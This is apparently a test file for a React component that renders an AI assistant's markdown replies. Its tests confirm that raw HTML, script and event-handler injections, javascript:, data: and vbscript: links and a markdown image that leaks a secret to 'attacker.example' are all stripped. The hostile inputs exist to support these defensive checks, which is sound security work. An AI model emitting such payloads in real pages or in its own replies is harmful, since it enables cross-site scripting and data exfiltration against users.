import { render, screen } from '@testing-library/react';
import { describe, expect, test } from 'vitest';

import AssistantMessageText from '@/src/components/Analytics/QueryBuilder/Ai/AssistantMessageText';

const renderText = (content: string) => render(<AssistantMessageText content={content} />);

describe('AssistantMessageText', () => {
  test('renders lists, emphasis and inline code', () => {
    renderText('Changes:\n\n- **Added** a filter on `model`\n- Removed the sort');

    expect(screen.getAllByRole('listitem')).toHaveLength(2);
    expect(screen.getByText('Added').tagName).toBe('STRONG');
    expect(screen.getByText('model').tagName).toBe('CODE');
  });

  test('drops raw HTML instead of rendering it', () => {
    const { container } = renderText(
      'Hi <script>window.pwned = 1</script><img src=x onerror="window.pwned = 1"><b onclick="x()">bold</b>',
    );

    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror], [onclick]')).toBeNull();
    expect((window as unknown as { pwned?: number }).pwned).toBeUndefined();
  });

  test('does not render a markdown image, so no request leaves for its host', () => {
    const { container } = renderText('![leak](https://attacker.example/pixel.png?q=secret)');

    expect(container.querySelector('img')).toBeNull();
  });

  test('keeps an http link and opens it in a new tab without an opener', () => {
    renderText('[docs](https://example.com/docs)');

    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('href', 'https://example.com/docs');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  test.each(['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:x'])(
    'renders a %s link as plain text',
    (url) => {
      renderText(`[click](${url})`);

      expect(screen.queryByRole('link')).toBeNull();
      expect(screen.getByText('click')).toBeTruthy();
    },
  );

  test('renders a heading as plain text', () => {
    renderText('# Title');

    expect(screen.queryByRole('heading')).toBeNull();
    expect(screen.getByText('Title')).toBeTruthy();
  });
});
